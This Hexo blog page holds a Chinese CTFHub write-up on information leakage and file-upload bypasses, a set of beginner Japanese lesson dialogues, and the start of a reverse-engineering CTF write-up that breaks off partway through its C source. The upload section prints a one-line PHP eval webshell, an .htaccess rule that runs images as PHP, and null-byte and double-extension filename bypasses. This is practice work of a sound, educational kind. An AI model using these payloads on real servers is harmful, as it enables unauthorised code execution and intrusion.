<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/page/2/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 5.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-CTF-wp-CTFHub" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/02/18/CTF-wp-CTFHub/" class="article-date">
  <time class="dt-published" datetime="2021-02-18T00:49:20.000Z" itemprop="datePublished">2021-02-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/02/18/CTF-wp-CTFHub/">CTF-wp-CTFHub</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h1><h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p>在这个目录下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10080&#x2F;flag_in_here&#x2F;3&#x2F;2&#x2F;flag.txt</span><br></pre></td></tr></table></figure>
<h2 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h2><p>在页面搜索flag</p>
<h3 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a>备份文件下载</h3><p>访问<a target="_blank" rel="noopener" href="http://www.zip,得到网站源文件/">www.zip，得到网站源文件</a></p>
<p>看到flag_259802413.txt，打开后没内容</p>
<p>在网页端访问flag_259802413.txt，得到flag</p>
<h3 id="bak文件"><a href="#bak文件" class="headerlink" title="bak文件"></a>bak文件</h3><p>访问index.php.bak，在下载的文件中得到flag</p>
<h3 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h3><p>访问.index.php.swp</p>
<p>执行命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim -r index.php.swp</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="无验证"><a href="#无验证" class="headerlink" title="无验证"></a>无验证</h2><p>直接上传，用antsword连接（菜刀被禁了）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;fca79403ea30c31b6413be65&#125;</span><br></pre></td></tr></table></figure>
<h2 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h2><p>取消前端js后，直接上传，用antsword连接</p>
<p>php文件无法下载，也不知道为什么</p>
<p>直接在页面执行命令，用cat查看flag文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;a849b8485adeaf5a66c6f477&#125;</span><br></pre></td></tr></table></figure>
<h2 id="MIME验证"><a href="#MIME验证" class="headerlink" title="MIME验证"></a>MIME验证</h2><p>将content-type修改为image/jpeg，其他操作与上面相同</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;5e9686dcfdf07612284fddae&#125;</span><br></pre></td></tr></table></figure>
<h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h2><p>.htaccess的格式为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;1.jpg&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;    </span><br></pre></td></tr></table></figure>
<p>然后上传一个php文件，在burp中将文件名改为1.jpg</p>
<p>使用antsword连接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;6e504a1abc30e2ca266b7335&#125;</span><br></pre></td></tr></table></figure>
<h2 id="文件头检查"><a href="#文件头检查" class="headerlink" title="文件头检查"></a>文件头检查</h2><p>在文件内容前添加GIF89a</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;d.php&quot;</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;caa67ce803f60c6f9776b631&#125;</span><br></pre></td></tr></table></figure>
<h2 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h2><p>在URL处，修改URL为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;?road&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;1.php%00 HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>
<p>而用户名处，修改用户名为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.jpg</span><br></pre></td></tr></table></figure>
<p>注意，此处修改用户名为1.php%001.jpg，虽然能上传成功，但是无法用antsword连接（</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;8df08862cb34869e11b4cf33&#125;</span><br></pre></td></tr></table></figure>
<h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><p>将文件名修改为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.phphpp</span><br></pre></td></tr></table></figure>
<p>即可成功上传</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;7abd22955056b5d994fc2f14&#125;</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/18/CTF-wp-CTFHub/" data-id="ckloj8nvu0003vcus9r1z1m61" data-title="CTF-wp-CTFHub" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-考证-日语-初级课文汉译日" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/02/15/%E8%80%83%E8%AF%81-%E6%97%A5%E8%AF%AD-%E5%88%9D%E7%BA%A7%E8%AF%BE%E6%96%87%E6%B1%89%E8%AF%91%E6%97%A5/" class="article-date">
  <time class="dt-published" datetime="2021-02-15T14:30:56.000Z" itemprop="datePublished">2021-02-15</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/02/15/%E8%80%83%E8%AF%81-%E6%97%A5%E8%AF%AD-%E5%88%9D%E7%BA%A7%E8%AF%BE%E6%96%87%E6%B1%89%E8%AF%91%E6%97%A5/">考证-日语-初级课文汉译日</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="第7课"><a href="#第7课" class="headerlink" title="第7课"></a>第7课</h1><p>李さんは毎日　<strong>コーヒー</strong>　を飲みます</p>
<p>李さんは　<strong>図書館（としょかん）</strong>　で　<strong>勉強（べんきょう）</strong>　します</p>
<p>私は毎朝パンかお粥を食べます</p>
<p>コーラとケーキください</p>
<p>甲：李さん、今日うちで　<strong>新聞（しんぶん）</strong>　をよみますか</p>
<p>乙：いいえ、読みませんでした</p>
<p>甲：今朝何を食べますか</p>
<p>乙：何も食べませんでした</p>
<p>甲：吉田さん、日曜日何をしますか</p>
<p>乙：テニスか　<strong>じょぎんぐ</strong>　をします</p>
<p>甲：いらっしやいませ</p>
<p>乙：この　<strong>ノート　**と　**鉛筆（えんぴつ）</strong>　をください</p>
<p>吉田：李さん、これから　<strong>昼（ひる）</strong>　ご飯たべますか</p>
<p>李：はい、小野さんといしょに行きます</p>
<p>小野：　<strong>課長（かちょう）</strong>　は？</p>
<p>吉田：コンビニでお弁当とお茶を買いました</p>
<p>李：いつもはコンビニですか</p>
<p>吉田：いいえ、いつもは蕎麦屋へ、そばかうどんを食べます</p>
<p>李：そ　<strong>う</strong>　ですね</p>
<p>小野：李さん、今日そば屋へ行きますか</p>
<p>李：そうですね</p>
<p>小野：じゃ、課長、　<strong>失礼（しつれい）</strong>　します</p>
<p>吉田：いってら　<strong>っ</strong>　しゃ　<strong>い</strong></p>
<p>店员：　<strong>いらっしゃいませ</strong></p>
<p>小野：すみません、親子丼（おやこどん）ください、李さんは？</p>
<p>李：私もこれです</p>
<p>店员：かしこまりました</p>
<h1 id="第8课"><a href="#第8课" class="headerlink" title="第8课"></a>第8课</h1><p>李さんは　<strong>日本語（にほんご）</strong>　で　<strong>手紙（てがみ）</strong>　を書けます</p>
<p>私は小野さんにお土産をもらいました</p>
<p>私は小野さんに　<strong>辞書（こしょ）</strong>　をもらいました</p>
<p>李さんは明日長島さんに会います</p>
<p>甲：昨日母に　<strong>プレゼント</strong>　を送ります。</p>
<p>乙：何で送りますか</p>
<p>甲：　<strong>航空便（こうくうびん）</strong>　で送りました</p>
<p>甲：<strong>この映画（えいが）のチケットをだれにあげますか</strong></p>
<p>乙：李さんにあげます</p>
<p>甲：だれにこのパンフレットをもらいますか</p>
<p>乙：長島さんにもらいました</p>
<p>甲：すみません、李さんはいますか</p>
<p>乙：もう　<strong>帰り（かえり）</strong>　ましたよ</p>
<p>小野：さっき、長島さんに電話をあげました</p>
<p>李：<strong>スケジュール</strong>　表の件ですか</p>
<p>小野：はい</p>
<p>李：もう　<strong>ファックス</strong>　送りますたよ</p>
<p>小野：いつですか</p>
<p>李：昨日の　<strong>夕方（ゆうがた）</strong>　です、もう<strong>（一度いちど）</strong>　送りますか</p>
<p>小野：ええ、お願　<strong>い</strong>　します、私は　<strong>メール</strong>　で送ります</p>
<p>李：分かりました。</p>
<p>小野：李さん、たった今長島さんにメールをもらいました</p>
<p>李：ファックス　<strong>は</strong>　<strong>届き「とどき」</strong>　したか</p>
<p>小野：ええ、ファックスも、メールも届きました</p>
<p>李：そうですか、よかったです</p>
<p>小野：李さん、これ、ど　<strong>う</strong>　そ。箱根の写真集です。　<strong>前</strong>　に長島さんにもらいました</p>
<p>李：ありがとう　<strong>ござ</strong>　います　</p>
<h1 id="第9课"><a href="#第9课" class="headerlink" title="第9课"></a>第9课</h1><p>　<strong>四川（しせん）</strong>　料理は辛いです</p>
<p>この　<strong>スープ</strong>　はあまり熱くないです</p>
<p>旅行はとてもたのしかったです</p>
<p>中国は広い国です</p>
<p>甲：　<strong>天気</strong>　はよっかたですか</p>
<p>乙： いいえ、あまりよくなっかたです</p>
<p>甲：　<strong>天安門（てんあんもん）</strong>　へ行きましたか</p>
<p>乙：はい、とても　<strong>大きい（おおきい）</strong>　建物ですね</p>
<p>甲：　<strong>万里の長城（ばんりのちょうじょう）</strong>　は北京から遠いですか</p>
<p>乙：いいえ、あまり遠くないです</p>
<p>甲：北京ダックはたべましたか  <strong>##此处ha表对比，详见第5课语法5</strong></p>
<p>乙：はい、たべました、とてもおいしかったです</p>
<p>李：小野さん、この　<strong>浴衣（ゆかた）</strong>　はちょ　<strong>っ</strong>　と　<strong>小さい（ちいさい）</strong>　です</p>
<p>小野：あら、それは子供用です。これ、どう　<strong>ぞ</strong></p>
<p>李：これはちょっ　<strong>ど</strong>　いいです　　<strong>## ちょっと和ちょっど，前者为“稍微，一点”，后者为“正好，恰好”</strong></p>
<p>小野：李さん、熱いですか</p>
<p>李：いいえ、ちょっといいです、とても　<strong>気持ち（きもち）</strong>　がいいですね</p>
<p>李：小野さん、すばらしい　<strong>眺め（眺め）</strong>　ですね</p>
<p>小野：ええ、　<strong>本当（ほんとう）</strong>　に</p>
<p>李：小野さん、それは何ですか</p>
<p>小野：ああ、これは温泉のお粥です。李さんも　<strong>飲み（のみ）</strong>　ますか</p>
<p>李：はい。あまりおいしくなかったです</p>
<h1 id="第10课"><a href="#第10课" class="headerlink" title="第10课"></a>第10课</h1><p>　<strong>京都（きょうと）</strong>　の　<strong>紅葉（もみじ）</strong>　はとても有名です</p>
<p>この通りは　<strong>静か（しずか）</strong>　ではありません</p>
<p><strong>奈良（なら）</strong>　は静か町です</p>
<p>昨日は日曜日でした</p>
<p>甲：ど　<strong>ん</strong>　なお土産買いましたか</p>
<p>乙：綺麗な　<strong>人形（にんぎょう）</strong>　を買いました</p>
<p>甲：京都はどうでしたか</p>
<p>乙：とても綺麗でした、でも、静かではありませんでした</p>
<p>甲：横浜はどうな町ですか</p>
<p>乙：大きい町です、そして、にぎやかな町です</p>
<p>甲：東京の天気はどうでしたか</p>
<p>乙：昨日は晴れでした、でもおとといは雨でした</p>
<p>长岛：昨日京都へ行きました</p>
<p>小野：京都ですか？京都の紅葉はどうでしたか</p>
<p>長島：とても綺麗でした、でも、町はあまり静か　<strong>じゃ</strong>　ありませんでした</p>
<p>李：えっ？</p>
<p>長島：今ちょっど　<strong>修学旅行（しゅうがくりょこう）</strong>　の　<strong>シーズ</strong>　です、とてもにぎやかでした</p>
<p>李：この通りは静かですね</p>
<p>長島：ああ、今日は　<strong>平日（へいじつ）</strong>　ですね。でも、休みの日は　<strong>観光客（かんこうきゃく）</strong>　がとても多い、とてもにぎやかですよ</p>
<p>李：そうですか</p>
<p>李：あれえ、誰もいませんね</p>
<p>小野：そうですね</p>
<p>李：あの、すみません、この　<strong>美術館（びじゅつかん）</strong>　<strong>には</strong>　どうな　<strong>作品（さくひん）</strong>　が　<strong>あり</strong>　ますか</p>
<p>小野：世界中の有名な作家の　<strong>彫刻（ちょうこく）</strong>　です</p>
<p>長島：美術館の庭にもいろいろおもしろい　<strong>の</strong>　がありますよ</p>
<h1 id="第11课"><a href="#第11课" class="headerlink" title="第11课"></a>第11课</h1><p>小野さんは歌が好　<strong>き</strong>　です</p>
<p>スミスさんは　<strong>韓国（かんこく）</strong> 語が分かります</p>
<p>吉田さんは　<strong>時々（ときどき）</strong>　<strong>中国（ちゅうごく）</strong>　や韓国へ行きます</p>
<p>森さんはお酒が好きですから、毎日飲みます</p>
<p>甲：吉田さんは料理ができますか</p>
<p>乙：いいえ、全然できません</p>
<p>甲：どうな音楽が好きですか</p>
<p>乙：　<strong>ロック</strong>　や　<strong>ポップス</strong>　などが好きです</p>
<p>甲：長島さん、　<strong>スペイン</strong>　語が分かりますか</p>
<p>乙：ええ、大学で　<strong>習い（習い）</strong>　ましたから、　<strong>少し（すこし）</strong>　分かります</p>
<p>甲：小野さん、よく音楽が聞きますか</p>
<p>乙：ええ、家でＣＤをよく聞きます。そして、たまにコンサートへ行きます</p>
<p>李：箱根のホテルや、旅館が多いですね</p>
<p>小野：そうですね、会社の　<strong>別荘（べっそう）</strong>　もたくさん　<strong>あります</strong></p>
<p>李：長島さんや、小野さんもよく来ますか</p>
<p>長島：はい、時々車で来ます</p>
<p>小野：私は　<strong>運転（うんてん）</strong>　ができません、いつも電車です</p>
<p>長島：僕は来月また来ますよ</p>
<p>李：どうしてですか</p>
<p>長島：この近くのホテルで友達の写真展がありますから</p>
<p>李：箱根のお土産は　<strong>何が</strong>　いいですか</p>
<p>小野：そうですね…迷いですね</p>
<p>長島：　<strong>寄木細工（よせぎざいく）</strong>　はどうですか？とても　<strong>有名（ゆうめい）</strong>　ですよ</p>
<p>李：きれいな　<strong>模様（もよう）</strong>　です</p>
<p>小野：そうですね</p>
<p>長島：好きですか</p>
<p>李：はい、とても</p>
<h1 id="第12课"><a href="#第12课" class="headerlink" title="第12课"></a>第12课</h1><p>李さんは森さんより若いです</p>
<p>日本より、中国のほうが広いです</p>
<p>　<strong>神戸（こうべ）</strong>　は大阪　<strong>ほど</strong>　にぎやかではありません</p>
<p>スポーツの中で　<strong>サッカー</strong>　はいちばんおもしろいです</p>
<p>甲：北京は　<strong>東京（とうきょう）</strong>　より寒いですか</p>
<p>乙：はい、冬の北京は東京よりずっと寒いです</p>
<p>甲：日本語と英語とどちらが難しいですか</p>
<p>乙：日本語　<strong>のほうが</strong>　難しいです</p>
<p>甲：森さんはテニスが　<strong>上手（じょうず）</strong>　ですね</p>
<p>乙：いいえ、長島さんのほど上手ではありません</p>
<p>甲：季節の中でいつがいちばんすきですか</p>
<p>乙：春がいちばん好きです</p>
<p>李：長島さん、よくお酒を飲みますか</p>
<p>長島：ええ、お酒　<strong>は</strong>　<strong>大好き（だいすき）</strong>　ですから、毎晩飲みます</p>
<p>李：<strong>ビール</strong>　と日本酒と、どちらかすきですか？</p>
<p>長島：どちらも好きです、でも、<strong>焼酎（しょうちゅう）</strong>　<strong>が</strong>　いちばん好きです</p>
<p>小野：焼酎は最近人気がありますね</p>
<p>李：小野さんも焼酎が好きですか？</p>
<p>小野：いいえ、焼酎より、　<strong>ワイン</strong>　の　<strong>ほうが</strong>　いいです。でも、ビールもよく飲みます</p>
<p>長島：中国　<strong>は</strong>　お茶が多いですね</p>
<p>李：え。　<strong>ウーロン</strong>　茶か、ジャスミン茶か、　<strong>緑茶（りょくちゃ）</strong>　<strong>など</strong>　、いろいろありますよ</p>
<p>小野：どのお茶がいちばん人気がありますか</p>
<p>李：<strong>やっぱり</strong>　ウーロン茶です</p>
<p>小野：李さんもよくお茶を飲みますか</p>
<p>李：ええ、毎日ウーロン茶かジャスミン茶　<strong>を</strong>　飲みます</p>
<p>長島：<strong>どちら</strong>　がおいし　<strong>い</strong>　ですか</p>
<p>李：どちらもおいしいですよ。わたしはジャスミン茶　<strong>のほうがすきですが</strong></p>
<h1 id="第13课"><a href="#第13课" class="headerlink" title="第13课"></a>第13课</h1><p>机の上に上に本が３　<strong>冊（さつ）</strong>　あります</p>
<p>李さんは毎日７時間働きます</p>
<p>李さんは1週間に２回プールへ行きます</p>
<p>午後ゆうべゆうべ荷物を出しに行きます</p>
<p>甲：すみません、　<strong>はがき</strong>　を５枚ください</p>
<p>乙：はい、５枚で２５０円です</p>
<p>甲：よく映画を見ますか</p>
<p>乙：ええ、1か月に二回　<strong>ぐらい</strong>　みます</p>
<p>甲：家から会社まで　<strong>どのぐらい</strong>　かかりますか</p>
<p>乙：電車で１時間ぐらいかかります</p>
<p>甲：昨日何をしましたか</p>
<p>乙：<strong>新宿（しんじゅく）</strong>　へ　<strong>映画（えいが）</strong>　を見に行きました</p>
<p>小野：これから森さんと近くのお店へ飲みに行きます。李さんもいしょにど　<strong>う</strong>　でしたか</p>
<p>李：えっ、いいですか、お願　<strong>い</strong>　します</p>
<p>李：森さんたちはよくこのお店へ行きますか</p>
<p>森：ええ、ぼくは週に２回来ます</p>
<p>小野：わたしもよく来ます</p>
<p>森：あの　<strong>う</strong>　、すみません、とりあえず生ビールを３　<strong>つ</strong>　ください</p>
<p>李：生ビールは１　<strong>杯（はい）</strong>　３００円ですか</p>
<p>森：ここはお酒も食べ物も安いです、焼き鳥は５本４００円ですからね</p>
<p>小野：唐揚げや肉じゃがは１　<strong>皿（さら）</strong>　３５０円です</p>
<p>李：ほかのお店はいくらぐらいですか</p>
<p>森：焼き鳥は１本１５０円ぐらいです</p>
<p>李：<strong>じゃあ</strong>、ここは安いですね</p>
<h1 id="第14课"><a href="#第14课" class="headerlink" title="第14课"></a>第14课</h1><p>昨日デパートへ行って、　<strong>買い物しました</strong></p>
<p>李さんは毎晩ラジオを聞いてから寝ます</p>
<p>ここに住所と名前を書いてください</p>
<p>李さんは毎朝７時に家を出ます</p>
<p>甲：今日の午後は何をしますか</p>
<p>乙：図書館へ行ってから、　<strong>勉強（べんきょう）</strong>　<strong>を</strong>　します。そして家へ　<strong>帰って（かえって）</strong>　、手紙を書きます</p>
<p>甲：いつ出かけますか</p>
<p>乙：昼ご飯　<strong>を</strong>　たべてから、でかけます</p>
<p>甲：すみません、この荷物を中国へ　<strong>送って（おくって）</strong>　ください</p>
<p>乙：船便ですか、　<strong>航空便（こうくうびん）</strong>　ですか</p>
<p>甲：船便でお願いします</p>
<p>甲：このバスはえきまえを通りますか</p>
<p>乙：はい、　<strong>通（とお）</strong>　ります</p>
<p>李：吉田　<strong>課長（かちょう）</strong>　、原稿ができました</p>
<p>吉田：箱根の記事ですね、　<strong>ちょっと</strong>　見せてください</p>
<p>吉田：なかなかいいですね、いつできましたか</p>
<p>李：　<strong>昨日（きのう）</strong>　会社　<strong>で</strong>　整理して、小野さんに　<strong>見せました</strong>。　そしてデパートへ帰って、書きました</p>
<p>吉田：そうですか、大変ですね。写真もできましたか</p>
<p>り：はい、これから長島の　<strong>事務所（じむしょ）</strong>　へ行って、写真を選びます</p>
<p>吉田：そうですか</p>
<p>り：後で写真も見せてませんか</p>
<p>吉田：李さん、もう会社を出ますか</p>
<p>李：はい、銀行　<strong>で</strong>　お金を　<strong>下ろして（おろして）</strong>から、<strong>行きます</strong></p>
<p>吉田：じゃあ、近くの郵便局を通りますね。すみません　<strong>が</strong>、この手紙を　<strong>出して</strong>　ください</p>
<p>り：はい。　<strong>速達（そくたつ）</strong>　で出しますか</p>
<p>吉田：はい、　<strong>そうしてください</strong></p>
<h1 id="第15课"><a href="#第15课" class="headerlink" title="第15课"></a>第15课</h1><p>小野さんはいま　<strong>新聞（しんぶん）</strong>　を読んでいます</p>
<p>ここで写真をとってもいいですか</p>
<p>飛行機の中でタバコを吸ってはいけません</p>
<p>日曜日、小野さんは公園　<strong>で</strong>　ボート　<strong>に</strong>　乗ります</p>
<p>甲：もしもし、森さん、今どこですか</p>
<p>乙：今市役所の前を　<strong>歩（歩）</strong>　いています</p>
<p>甲：すみません、この　<strong>辞書（じしょ）</strong>　を　<strong>借り（かり）</strong>　でもいいですか</p>
<p>乙：ええ、　<strong>ちょっと</strong>。。。今　<strong>使（つか）</strong>　っています</p>
<p>甲：すみません、ここ　<strong>に</strong>　座ってもいいですか</p>
<p>乙：はい、どうぞ</p>
<p>甲：あっ、ここで携帯電話を使ってはいけません</p>
<p>乙：すみません、これから気を付けます</p>
<p>小野：もしもし、小野です、どうしました？</p>
<p>李：ちょっと　<strong>熱（ねつ）</strong>　があります。今日休んでもいいですか</p>
<p>小野：ええ、　<strong>もちろん</strong>　です。あまり無理をしではいけませんよ</p>
<p>李：はい、分かりました。　<strong>あのう</strong>、吉田課長は？</p>
<p>小野：今　<strong>会議室（かいぎしつ）</strong>　で打合せをしています、後で伝えます</p>
<p>李：お願いします</p>
<p>小野：もう　<strong>病院（びょういん）</strong>　に行くの</p>
<p>李：いいえ、まだです</p>
<p>小野：　<strong>じゃあ</strong>　、病院に行ってから、ゆっくり休んでください</p>
<p>李：はい、ありがとうございます</p>
<p>医者：風邪ですね。温かい物をたべて、十分　<strong>睡眠（すいみん）</strong>　をとってください。それから、今晩お風呂に入ってはいけません</p>
<p>李：分かりました。</p>
<p>医者：では、薬をだします。薬局に行って、もらってください</p>
<p>李：ありがとうございます</p>
<p>医者：お大事に</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/15/%E8%80%83%E8%AF%81-%E6%97%A5%E8%AF%AD-%E5%88%9D%E7%BA%A7%E8%AF%BE%E6%96%87%E6%B1%89%E8%AF%91%E6%97%A5/" data-id="ckla3x5dr0002z0usc4lvgvax" data-title="考证-日语-初级课文汉译日" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%80%83%E8%AF%81/" rel="tag">考证</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-CTF-wp-攻防世界reverse初级" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/02/12/CTF-wp-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Creverse%E5%88%9D%E7%BA%A7/" class="article-date">
  <time class="dt-published" datetime="2021-02-12T02:33:31.000Z" itemprop="datePublished">2021-02-12</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/02/12/CTF-wp-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Creverse%E5%88%9D%E7%BA%A7/">CTF-wp-攻防世界reverse初级</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="open-source"><a href="#open-source" class="headerlink" title="open-source"></a>open-source</h1><p>考察：gcc的使用，c源码阅读</p>
<p>首先，gcc编译</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc 1.c -o 1.exe</span><br></pre></td></tr></table></figure>
<p>其次，阅读源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123; <span class="comment">// argc为参数格式，argv为命令行传入的参数</span></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">4</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;what?\n&quot;</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> first = atoi(argv[<span class="number">1</span>]); <span class="comment">// 将字符串转化为数字（有数字转数字，遇到字母就停止运算</span></span><br><span class="line">    <span class="keyword">if</span> (first != <span class="number">0xcafe</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;you are wrong, sorry.\n&quot;</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> second = atoi(argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">if</span> (second % <span class="number">5</span> == <span class="number">3</span> || second % <span class="number">17</span> != <span class="number">8</span>) &#123; <span class="comment">// 25</span></span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;ha, you won&#x27;t get it!\n&quot;</span>);</span><br><span class="line">    	<span 